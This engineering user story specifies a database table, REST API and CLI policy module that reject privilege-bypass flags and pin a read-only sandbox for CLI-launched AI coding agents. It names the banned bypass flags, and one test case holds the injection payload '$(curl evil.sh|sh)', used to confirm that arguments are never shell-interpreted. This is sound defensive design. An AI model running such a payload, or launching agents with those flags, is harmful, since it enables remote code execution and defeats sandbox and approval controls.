### User Story
As a **Workspace / Project Admin registering transition-gate agents**, I need **the `agent_definitions` table, a service + REST API to manage it, and a shared CLI policy module that rejects non-allowlisted binaries and privilege-bypass flags at save time and again at runtime** so that **no `cli_pipe` agent can ever be configured or launched with `--yolo`, `--dangerously-*`, `--full-auto`, `--allow-all-tools`, or an unpinned `codex` sandbox mode, and every agent is an RLS-scoped `AGENT` principal**.

**Requirement Traceability:** `S14.2` (DDL `agent_definitions`, 3 harnesses), `S14.3` item 1 (direct `execve`, banned flags, `codex` pin `["/usr/local/bin/codex", "-p", "-s", "read-only", ...]`), `S3.2` (OBO intersection, agents as principals), `S3.5` row "CLI Pipe Injection" | Original requirement `#2`, ScriptRunner row of the traceability matrix | **Dependencies:** `KB-P1-14`, `KB-P2-11`

2. **DDL (verbatim from S14.2, plus RLS and consistency CHECKs):**
   ```sql
   CREATE TABLE agent_definitions ( ... exactly as S14.2 lines 948-966 ... );
   ALTER TABLE agent_definitions ADD CONSTRAINT agent_def_harness_fields CHECK (
     (harness_kind = 'in_app_sdk'    AND provider_kind IS NOT NULL AND model_id IS NOT NULL AND cli_binary_allowlist_id IS NULL AND remote_runner_pool_slug IS NULL) OR
     (harness_kind = 'cli_pipe'      AND cli_binary_allowlist_id IS NOT NULL AND remote_runner_pool_slug IS NULL) OR
     (harness_kind = 'remote_runner' AND remote_runner_pool_slug IS NOT NULL)
   );
   ALTER TABLE agent_definitions ADD CONSTRAINT agent_def_mcp_tools_subset CHECK (
     mcp_allowed_tools <@ ARRAY['search_tickets','read_ticket','search_knowledge','read_doc']::text[]
   );
   ALTER TABLE agent_definitions ADD CONSTRAINT agent_def_args_is_array CHECK (jsonb_typeof(cli_args_json) = 'array');
   ALTER TABLE agent_definitions ENABLE ROW LEVEL SECURITY;
   ALTER TABLE agent_definitions FORCE ROW LEVEL SECURITY;
   ```
   - `SELECT` policy: `workspace_id = current_setting('app.workspace_id', true)::uuid` AND (project-scoped rows require `VIEW` on `project_id` via `effective_resource_access`).
   - `INSERT/UPDATE/DELETE` policy `WITH CHECK`: workspace-level rows (`project_id IS NULL`) require `WORKSPACE_ADMIN`; project rows require `PROJECT_ADMIN` on that project (role check function from `KB-P1-13`/`KB-P1-14`).
3. **CLI policy (`kanban/agents/cli_policy.py`):**
   - `BANNED_FLAGS: Final[frozenset[str]] = frozenset({"--yolo", "--dangerously-bypass-approvals-and-sandbox", "--dangerously-skip-permissions", "--full-auto", "--allow-all-tools"})`.
   - `BINARY_ALLOWLIST: Final[Mapping[str, str]] = {"agy": "/usr/local/bin/agy", "codex": "/usr/local/bin/codex", "gemini-cli": "/usr/local/bin/gemini", "claude-code": "/usr/local/bin/claude"}` (ids match the DDL CHECK; paths for `gemini-cli` / `claude-code` are not specified in the spec and are recorded as an open item in `message-to-reality-checker.md`).
   - `CODEX_PINNED_PREFIX: Final = ("-p", "-s", "read-only")`.
   - `validate_cli_args(binary_id: str, args: Sequence[str]) -> ValidatedArgv` raising `CliPolicyError(code, detail)`; rules:
     - `binary_id` not in `BINARY_ALLOWLIST` -> `CLI_BINARY_NOT_ALLOWLISTED`.
     - Every arg is `str`, `1..256` UTF-8 bytes, no NUL / CR / LF; `len(args) <= 32` -> else `CLI_ARGS_INVALID`.
     - Any arg equal to a banned flag, starting with `<banned>=`, or starting with `--dangerously` (catches abbreviations and future variants), compared after `casefold()` -> `BANNED_CLI_FLAG`.
     - `codex`: `args[:3]` must equal `CODEX_PINNED_PREFIX`; any later `-s`, `--sandbox`, `--sandbox=*`, `-c`, `--config`, `--config=*` -> `CODEX_SANDBOX_OVERRIDE`.
     - Returns `ValidatedArgv(argv=(BINARY_ALLOWLIST[binary_id], *args))` (immutable tuple; never a string, never joined).
   - `assert_runtime_argv(defn: AgentDefinition) -> ValidatedArgv`: re-runs `validate_cli_args` on the stored row (defense against rows written before a policy update or by direct DB tampering); callers (KB-P5-21, KB-P5-22b) MUST call it immediately before spawn.
4. **Service + API:**
   - `AgentDefinitionService.create()` creates the `principals` row (`principal_type='AGENT'`, same `workspace_id`) and the `agent_definitions` row in one transaction; `delete()` maps FK `RESTRICT` violations (hooks referencing the agent) to `409 AGENT_IN_USE`.
   - Routes: `GET /api/v1/workspaces/{workspace}/agent-definitions`, `POST /api/v1/workspaces/{workspace}/agent-definitions`, `GET|PATCH|DELETE /api/v1/agent-definitions/{agent}` (`{agent}` = slug or UUID).
   - Errors: `422` with `code` in `{BANNED_CLI_FLAG, CLI_BINARY_NOT_ALLOWLISTED, CLI_ARGS_INVALID, CODEX_SANDBOX_OVERRIDE, HARNESS_FIELDS_INVALID}`; unreadable or cross-workspace agents return `404` (never `403`).
   - `system_instructions_md` capped at `65,536` bytes and passed through the `KB-P2-13` normalizer; `timeout_ms` validated `1000..300000` in Pydantic before the DB CHECK.
   - Response serializer includes `principal_id`, `harness_kind`, `provider_kind`, `model_id`, `cli_binary_allowlist_id`, `cli_args` (array), `repo_access_mode`, `mcp_allowed_tools`, `timeout_ms`; never includes provider API keys (none stored here).
5. **Audit:** every create/update/delete writes an `activity_records` row (`AGENT_DEFINITION_CREATED|UPDATED|DELETED`) including the validated argv tuple.

  3.   4. Security: arg containing `$(curl evil.sh|sh)` is accepted only as an opaque argv element (no shell) but an arg with `\n` or NUL -> `CLI_ARGS_INVALID`; `33` args -> `CLI_ARGS_INVALID`; 257-byte arg -> `CLI_ARGS_INVALID`.
  5. Runtime: row inserted via raw SQL as migrator with `cli_args_json='["--yolo"]'` -> `assert_runtime_argv` raises `BANNED_CLI_FLAG`.
  6. RLS: `MEMBER` `POST` -> `404`/`403`-indistinguishable denial and DB `WITH CHECK` rejects direct insert as `kanban_app` with member context; query without `app.workspace_id` returns `0` rows; other-workspace agent `GET` -> `404`.

  8. Delete referenced agent (FK from a stub hook row) -> `409 AGENT_IN_USE`.
